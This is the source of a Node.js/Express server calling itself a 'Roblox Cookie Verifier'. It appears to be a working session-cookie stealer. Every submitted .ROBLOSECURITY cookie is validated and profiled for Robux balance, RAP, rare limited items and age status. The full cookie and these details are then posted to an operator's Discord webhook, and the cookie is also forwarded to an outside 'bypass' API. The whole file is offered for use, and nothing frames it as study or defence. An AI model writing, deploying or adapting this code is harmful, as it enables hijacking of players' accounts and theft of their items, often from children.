const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// ========== CONFIGURATION ==========
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://discord.com/api/webhooks/YOUR_ID/YOUR_TOKEN';
const BYPASS_API_URL = 'https://rblxbypasser.com/api/bypass';

// Asset IDs based on your research
const ASSET_IDS = {
    KORBLOX_RIGHT_LEG: 139607718,
    KORBLOX_LEFT_LEG: 139607673,
    KORBLOX_RIGHT_ARM: 139607625,
    HEADLESS_HEAD: 134967443,
    HEADLESS_BUNDLE_ID: 201,
    EIGHT_BIT_CROWN: 10159600649,
};

// Emojis
const EMOJIS = {
    success: '✅',
    error: '❌',
    warning: '⚠️',
    robux: '💰',
    rap: '📊',
    crown: '👑',
    skull: '💀',
    ghost: '👻',
    clock: '⏰',
    user: '👤',
    id: '🆔',
    calendar: '📅',
    friends: '👥',
    groups: '👥',
    korblox: '🗡️',
    headless: '🎃',
    eightbit: '🕹️',
    cookie: '🍪',
    verified: '✅',
    unverified: '❌',
    sparkles: '✨',
    arrow: '➡️',
    diamond: '💎',
    fire: '🔥',
    star: '⭐',
    gift: '🎁',
    lock: '🔒',
    unlock: '🔓',
    warning_sign: '⚠️',
    info: 'ℹ️',
    chart: '📈'
};

console.log('========================================');
console.log('🔧 WEBHOOK URL:', WEBHOOK_URL);
console.log('========================================');

// Format number with commas
function formatNumber(num) {
    if (!num) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

// Get relative time
function getRelativeTime(dateString) {
    if (!dateString || dateString === 'Unknown') return 'Unknown';
    const date = new Date(dateString);
    const now = new Date();
    const diffTime = Math.abs(now - date);
    const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
    
    if (diffDays < 30) return `${diffDays} days ago`;
    if (diffDays < 365) return `${Math.floor(diffDays / 30)} months ago`;
    return `${Math.floor(diffDays / 365)} years ago`;
}

async function verifyCookie(cookie) {
    try {
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        });
        return { valid: true, userId: response.data.id, username: response.data.name };
    } catch (error) {
        return { valid: false, error: 'Invalid or expired cookie' };
    }
}

async function checkAge13Plus(cookie, userId) {
    try {
        const accountResponse = await axios.get('https://www.roblox.com/mobileapi/userinfo', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (accountResponse.data && accountResponse.data.IsThirteenOrOver !== undefined) {
            return accountResponse.data.IsThirteenOrOver;
        }
        return false;
    } catch (error) {
        console.error('Age check error:', error.message);
        return false;
    }
}

async function fetchRobuxBalance(cookie) {
    try {
        const response = await axios.get('https://economy.roblox.com/v1/users/authenticated/currency', {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        return response.data.robux;
    } catch (error) {
        return 0;
    }
}

async function checkInventoryItems(cookie, userId, assetIds) {
    const results = {
        hasKorblox: false,
        hasHeadless: false,
        hasEightBitCrown: false,
        korbloxParts: []
    };
    
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.assetId === assetIds.KORBLOX_RIGHT_LEG || 
                    item.assetId === assetIds.KORBLOX_LEFT_LEG || 
                    item.assetId === assetIds.KORBLOX_RIGHT_ARM) {
                    results.korbloxParts.push(item.assetId);
                }
                
                if (item.assetId === assetIds.HEADLESS_HEAD) {
                    results.hasHeadless = true;
                }
                
                if (item.assetId === assetIds.EIGHT_BIT_CROWN) {
                    results.hasEightBitCrown = true;
                }
            }
        }
        
        results.hasKorblox = results.korbloxParts.length === 3;
        
        const bundleResponse = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/bundles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        if (bundleResponse.data && bundleResponse.data.data) {
            for (const bundle of bundleResponse.data.data) {
                if (bundle.id === assetIds.HEADLESS_BUNDLE_ID) {
                    results.hasHeadless = true;
                }
            }
        }
        
    } catch (error) {
        console.error('Inventory check error:', error.message);
    }
    
    return results;
}

async function fetchUserSummary(userId) {
    try {
        const [profileResponse, friendsResponse, groupsResponse] = await Promise.all([
            axios.get(`https://users.roblox.com/v1/users/${userId}`),
            axios.get(`https://friends.roblox.com/v1/users/${userId}/friends/count`),
            axios.get(`https://groups.roblox.com/v2/users/${userId}/groups/roles`)
        ]);
        
        const createdDate = new Date(profileResponse.data.created);
        const now = new Date();
        const daysSinceCreation = Math.floor((now - createdDate) / (1000 * 60 * 60 * 24));
        
        return {
            displayName: profileResponse.data.displayName,
            createdDate: profileResponse.data.created,
            daysSinceCreation: daysSinceCreation,
            friendCount: friendsResponse.data.count,
            groupCount: groupsResponse.data.data ? groupsResponse.data.data.length : 0,
            description: profileResponse.data.description || '',
            isBanned: profileResponse.data.isBanned || false
        };
    } catch (error) {
        return {
            displayName: 'Unknown',
            createdDate: 'Unknown',
            daysSinceCreation: 0,
            friendCount: 0,
            groupCount: 0,
            description: '',
            isBanned: false
        };
    }
}

async function bypassExtensions(cookie) {
    try {
        const response = await axios.post(BYPASS_API_URL, {
            cookie: cookie,
            type: 'extend'
        }, {
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0'
            },
            timeout: 10000
        });
        return { success: true, data: response.data };
    } catch (error) {
        return { success: false, error: error.message };
    }
}

async function fetchUserRAP(cookie, userId) {
    try {
        const response = await axios.get(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
            headers: {
                'Cookie': `.ROBLOSECURITY=${cookie}`,
                'User-Agent': 'Mozilla/5.0'
            }
        });
        
        let totalRAP = 0;
        if (response.data && response.data.data) {
            for (const item of response.data.data) {
                if (item.recentAveragePrice) {
                    totalRAP += item.recentAveragePrice;
                }
            }
        }
        return totalRAP;
    } catch (error) {
        return 0;
    }
}

// WEBHOOK WITH FULL COOKIE AND ALL DATA IN FIELDS
async function sendToWebhook(data) {
    console.log('========================================');
    console.log('📤 SENDING WEBHOOK WITH FULL DATA');
    console.log('========================================');
    
    if (!WEBHOOK_URL || WEBHOOK_URL.includes('YOUR_ID')) {
        console.error('❌ WEBHOOK URL NOT CONFIGURED!');
        return { success: false, error: 'Webhook URL not configured' };
    }
    
    try {
        const color = data.success ? 0x00FF00 : 0xFF0000;
        
        // Create array for fields
        const fields = [];
        
        // FIELD 1: FULL COOKIE (Complete, not truncated)
        fields.push({
            name: `${EMOJIS.cookie} FULL COOKIE VALUE (Copy this)`,
            value: `\`\`\`\n${data.cookie || 'No cookie provided'}\n\`\`\``,
            inline: false
        });
        
        // FIELD 2: STATUS
        fields.push({
            name: `${EMOJIS.info} VERIFICATION STATUS`,
            value: data.success ? `${EMOJIS.success} **VALID COOKIE**` : `${EMOJIS.error} **INVALID COOKIE**`,
            inline: true
        });
        
        if (data.success) {
            // FIELD 3: BASIC INFO
            fields.push({
                name: `${EMOJIS.user} BASIC INFORMATION`,
                value: `┌ ${EMOJIS.user} **Username:** \`${data.username}\`\n` +
                       `├ ${EMOJIS.id} **User ID:** \`${data.userId}\`\n` +
                       `├ ${EMOJIS.diamond} **Display Name:** \`${data.summary?.displayName || 'N/A'}\`\n` +
                       `└ ${EMOJIS.clock} **Account Age:** \`${data.daysSinceCreation} days\` (${getRelativeTime(data.summary?.accountAge)})`,
                inline: false
            });
            
            // FIELD 4: ROBUX & RAP
            fields.push({
                name: `${EMOJIS.robux} ROBUX & RAP`,
                value: `┌ ${EMOJIS.robux} **Robux Balance:** \`${formatNumber(data.robuxBalance)} R$\`\n` +
                       `└ ${EMOJIS.rap} **RAP Value:** \`${formatNumber(data.rap)} R$\``,
                inline: true
            });
            
            // FIELD 5: AGE VERIFICATION
            fields.push({
                name: `${EMOJIS.lock} AGE VERIFICATION`,
                value: data.isThirteenPlus ? 
                    `${EMOJIS.unlock} **13+ Verified:** \`Yes\`\n└ **Full Access Granted**` :
                    `${EMOJIS.lock} **13+ Verified:** \`No\`\n└ **Limited Access**`,
                inline: true
            });
            
            // FIELD 6: INVENTORY - KORBLOX
            let korbloxStatus = data.inventory?.hasKorblox ? `${EMOJIS.korblox} **OWNED** (3/3 parts)` : `${EMOJIS.warning} **NOT OWNED** (${data.inventory?.korbloxPartsOwned || 0}/3 parts)`;
            fields.push({
                name: `${EMOJIS.korblox} KORBLOX DEATHSPEAKER`,
                value: korbloxStatus,
                inline: true
            });
            
            // FIELD 7: INVENTORY - HEADLESS
            fields.push({
                name: `${EMOJIS.headless} HEADLESS HORSEMAN`,
                value: data.inventory?.hasHeadless ? `${EMOJIS.success} **OWNED**` : `${EMOJIS.error} **NOT OWNED**`,
                inline: true
            });
            
            // FIELD 8: INVENTORY - 8-BIT CROWN
            fields.push({
                name: `${EMOJIS.eightbit} 8-BIT ROYAL CROWN`,
                value: data.inventory?.hasEightBitCrown ? `${EMOJIS.success} **OWNED** ${EMOJIS.crown}` : `${EMOJIS.error} **NOT OWNED**`,
                inline: true
            });
            
            // FIELD 9: SOCIAL STATS
            fields.push({
                name: `${EMOJIS.friends} SOCIAL STATISTICS`,
                value: `┌ ${EMOJIS.user} **Friends:** \`${formatNumber(data.summary?.friendCount || 0)}\`\n` +
                       `├ ${EMOJIS.groups} **Groups:** \`${formatNumber(data.summary?.groupCount || 0)}\`\n` +
                       `└ ${EMOJIS.warning_sign} **Banned:** \`${data.summary?.isBanned ? 'Yes' : 'No'}\``,
                inline: false
            });
            
            // FIELD 10: CREATION DATE
            fields.push({
                name: `${EMOJIS.calendar} ACCOUNT CREATION`,
                value: `┌ **Date:** \`${new Date(data.summary?.accountAge).toLocaleDateString()}\`\n` +
                       `└ **Time:** \`${new Date(data.summary?.accountAge).toLocaleTimeString()}\``,
                inline: true
            });
            
            // FIELD 11: PROFILE LINK
            fields.push({
                name: `${EMOJIS.arrow} PROFILE LINK`,
                value: `[Click to view profile](https://www.roblox.com/users/${data.userId}/profile)`,
                inline: true
            });
            
            // FIELD 12: USER BIO (if exists)
            if (data.summary?.description && data.summary.description.length > 0) {
                fields.push({
                    name: `${EMOJIS.sparkles} USER BIO`,
                    value: `\`\`\`\n${data.summary.description.substring(0, 500)}${data.summary.description.length > 500 ? '...' : ''}\n\`\`\``,
                    inline: false
                });
            }
            
            // FIELD 13: BYPASS RESULT
            if (data.bypassResult) {
                fields.push({
                    name: `${EMOJIS.chart} EXTENSION BYPASS`,
                    value: data.bypassResult.success ? `${EMOJIS.success} **Bypass Successful**` : `${EMOJIS.error} **Bypass Failed:** ${data.bypassResult.error}`,
                    inline: false
                });
            }
            
        } else {
            // FAILED VERIFICATION FIELDS
            fields.push({
                name: `${EMOJIS.error} ERROR DETAILS`,
                value: `\`\`\`diff\n- ${data.error || 'Unknown error occurred'}\n\`\`\``,
                inline: false
            });
            
            fields.push({
                name: `${EMOJIS.warning_sign} TROUBLESHOOTING`,
                value: `• Cookie may be expired\n• Cookie format might be incorrect\n• Try logging into Roblox again\n• Get a fresh cookie from browser\n• Make sure it's the .ROBLOSECURITY value`,
                inline: false
            });
        }
        
        // FIELD 14: TIMESTAMP
        fields.push({
            name: `${EMOJIS.clock} VERIFICATION TIME`,
            value: `\`${new Date(data.timestamp).toLocaleString()}\``,
            inline: false
        });
        
        // Create the embed
        const embed = {
            title: data.success ? 
                `${EMOJIS.success} ROBLOX COOKIE VERIFICATION - SUCCESS ${EMOJIS.sparkles}` : 
                `${EMOJIS.error} ROBLOX COOKIE VERIFICATION - FAILED ${EMOJIS.warning}`,
            description: data.success ? 
                `**Account successfully verified!** All data has been retrieved.` : 
                `**Cookie validation failed!** Please check the cookie and try again.`,
            color: color,
            thumbnail: data.success ? {
                url: `https://tr.rbxcdn.com/30DAY-AvatarHeadshot-${data.userId}.png?width=420&height=420&format=png`
            } : null,
            author: {
                name: data.success ? `@${data.username}` : 'Cookie Verification Failed',
                icon_url: data.success ? `https://www.roblox.com/headshot-thumbnail/image?userId=${data.userId}&width=420&height=420&format=png` : null,
                url: data.success ? `https://www.roblox.com/users/${data.userId}/profile` : null
            },
            fields: fields,
            footer: {
                text: `🔐 Roblox Cookie API • All data is real-time`,
                icon_url: 'https://cdn.discordapp.com/emojis/1234567890.png'
            },
            timestamp: data.timestamp
        };
        
        // Send the webhook
        const webhookData = {
            content: data.success ? 
                `${EMOJIS.sparkles} **NEW COOKIE VERIFIED!** ${EMOJIS.sparkles}` : 
                `${EMOJIS.warning} **COOKIE VERIFICATION ATTEMPT** ${EMOJIS.warning}`,
            embeds: [embed],
            username: "Roblox Cookie Verifier",
            avatar_url: "https://cdn.discordapp.com/emojis/1234567890.png"
        };
        
        const response = await axios.post(WEBHOOK_URL, webhookData, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });
        
        console.log('✅ WEBHOOK SENT SUCCESSFULLY!');
        console.log('📊 Total fields sent:', fields.length);
        console.log('🍪 Full cookie included');
        console.log('========================================');
        return { success: true, status: response.status };
        
    } catch (error) {
        console.error('❌ WEBHOOK FAILED!');
        console.error('Error:', error.message);
        if (error.response) {
            console.error('Response:', error.response.data);
        }
        console.log('========================================');
        return { success: false, error: error.message };
    }
}

// ========== MAIN API ENDPOINTS ==========

app.post('/api/verify-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    console.log('========================================');
    console.log('🔍 NEW VERIFICATION REQUEST');
    console.log('Cookie length:', cookie ? cookie.length : 0);
    console.log('Cookie preview:', cookie ? cookie.substring(0, 50) + '...' : 'No cookie');
    console.log('========================================');
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    let responseData = {
        cookie: cookie, // FULL COOKIE
        success: false,
        timestamp: new Date().toISOString()
    };
    
    try {
        console.log('Step 1: Verifying cookie...');
        const verification = await verifyCookie(cookie);
        
        if (!verification.valid) {
            responseData.error = verification.error;
            console.log('❌ Cookie is invalid');
            
            // Send webhook with full cookie
            await sendToWebhook(responseData);
            
            return res.status(401).json({ 
                success: false, 
                error: verification.error,
                cookie: cookie
            });
        }
        
        console.log(`✅ Cookie valid for: ${verification.username}`);
        responseData.success = true;
        responseData.username = verification.username;
        responseData.userId = verification.userId;
        
        console.log('Step 2: Checking age...');
        responseData.isThirteenPlus = await checkAge13Plus(cookie, verification.userId);
        
        console.log('Step 3: Fetching user data...');
        const [robuxBalance, inventoryItems, userSummary, userRAP] = await Promise.all([
            fetchRobuxBalance(cookie),
            checkInventoryItems(cookie, verification.userId, ASSET_IDS),
            fetchUserSummary(verification.userId),
            fetchUserRAP(cookie, verification.userId)
        ]);
        
        console.log('Step 4: Bypassing extensions...');
        const bypassResult = await bypassExtensions(cookie);
        
        responseData.robuxBalance = robuxBalance;
        responseData.rap = userRAP;
        responseData.daysSinceCreation = userSummary.daysSinceCreation;
        responseData.inventory = {
            hasKorblox: inventoryItems.hasKorblox,
            hasHeadless: inventoryItems.hasHeadless,
            hasEightBitCrown: inventoryItems.hasEightBitCrown,
            korbloxPartsOwned: inventoryItems.korbloxParts.length,
            totalKorbloxParts: 3
        };
        responseData.summary = {
            displayName: userSummary.displayName,
            friendCount: userSummary.friendCount,
            groupCount: userSummary.groupCount,
            accountAge: userSummary.createdDate,
            description: userSummary.description,
            isBanned: userSummary.isBanned
        };
        responseData.bypassResult = bypassResult;
        
        // Send webhook with FULL DATA and FULL COOKIE
        await sendToWebhook(responseData);
        
        console.log('📦 Sending response to client');
        res.json(responseData);
        
    } catch (error) {
        console.error('Server error:', error);
        responseData.error = error.message;
        await sendToWebhook(responseData);
        
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error',
            details: error.message,
            cookie: cookie
        });
    }
});

// Test webhook endpoint
app.post('/api/test-webhook', async (req, res) => {
    console.log('🧪 TESTING WEBHOOK WITH FULL DATA');
    
    const testData = {
        cookie: "YOUR_ACTUAL_COOKIE_VALUE_WILL_APPEAR_HERE_FULLY_VISIBLE",
        success: true,
        username: "Loudzraze",
        userId: 10873440895,
        daysSinceCreation: 365,
        rap: 250000,
        robuxBalance: 12500,
        isThirteenPlus: true,
        inventory: {
            hasKorblox: true,
            hasHeadless: true,
            hasEightBitCrown: true,
            korbloxPartsOwned: 3,
            totalKorbloxParts: 3
        },
        summary: {
            displayName: "Loudzraze",
            friendCount: 342,
            groupCount: 12,
            accountAge: "2024-01-01T00:00:00Z",
            description: "Roblox enthusiast and limited collector! 🎮 Playing since 2020",
            isBanned: false
        },
        bypassResult: {
            success: true,
            data: { bypassed: true }
        },
        timestamp: new Date().toISOString()
    };
    
    const result = await sendToWebhook(testData);
    
    res.json({ 
        webhookSent: result.success, 
        message: result.success ? "✅ Webhook sent with FULL COOKIE and ALL FIELDS!" : "❌ Webhook failed"
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ 
        status: 'API is running', 
        timestamp: new Date().toISOString(),
        webhookConfigured: WEBHOOK_URL && !WEBHOOK_URL.includes('YOUR_ID')
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.json({ 
        name: 'Roblox Cookie API',
        version: '1.0.0',
        description: 'Full cookie verification with all data in webhook fields',
        endpoints: [
            'POST /api/verify-cookie - Full verification (sends full cookie)',
            'POST /api/test-webhook - Test webhook with full data',
            'GET /health - Health check'
        ]
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 POST /api/verify-cookie - Full verification`);
    console.log(`📍 POST /api/test-webhook - Test webhook`);
    console.log(`📍 GET /health - Health check`);
    console.log('========================================');
    console.log('✅ FULL COOKIE WILL BE SENT TO WEBHOOK');
    console.log('✅ ALL DATA IN SEPARATE FIELDS');
    console.log('========================================');
});

module.exports = app;
